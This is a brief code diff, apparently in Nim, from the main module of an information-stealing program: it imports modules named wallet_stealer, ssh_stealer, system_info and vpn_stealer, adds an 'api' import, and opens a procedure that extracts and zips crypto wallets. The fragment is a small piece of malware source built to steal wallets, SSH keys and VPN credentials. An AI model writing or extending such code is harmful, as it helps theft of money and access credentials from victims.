@@ -5,6 +5,7 @@ import crypto_wallets/wallet_stealer
 import ssh_stealer/ssh_stealer
 import system_info/system_info
 import vpn_stealer/vpn_stealer
+import api/api
 
 proc crypto_wallets_manager()=
   let data = extractAndZipWallets()
